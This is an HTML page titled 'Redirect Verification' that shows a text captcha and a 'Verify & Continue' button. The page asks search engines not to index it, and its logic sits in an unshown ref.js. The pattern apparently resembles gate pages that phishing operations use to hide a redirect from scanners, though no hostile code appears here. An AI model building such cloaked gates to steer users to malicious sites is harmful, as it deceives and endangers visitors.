<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow" />
  <title>Redirect Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
      background-color: #f6f6f6;
    }
    .container {
      text-align: center;
      padding: 30px;
      border: 1px solid #ccc;
      border-radius: 12px;
      background: white;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      max-width: 400px;
    }
    .captcha-container {
      margin: 20px 0;
      padding: 15px;
      background: #f0f0f0;
      border-radius: 6px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .captcha-text {
      font-size: 24px;
      letter-spacing: 3px;
      font-weight: bold;
      color: #333;
      margin-bottom: 10px;
      user-select: none;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      background: #007BFF;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
    }
    input {
      padding: 8px;
      font-size: 16px;
      width: 100%;
      box-sizing: border-box;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Security Check</h2>
    <p>Please enter the text below to verify you're human:</p>
    
    <div class="captcha-container">
      <div class="captcha-text" id="captchaText"></div>
      <input type="text" id="captchaInput" placeholder="Enter the text above">
    </div>
    
    <button type="button" onclick="onVerify()">Verify & Continue</button>
  </div>

  <script src="ref.js"></script>
</body>
</html>
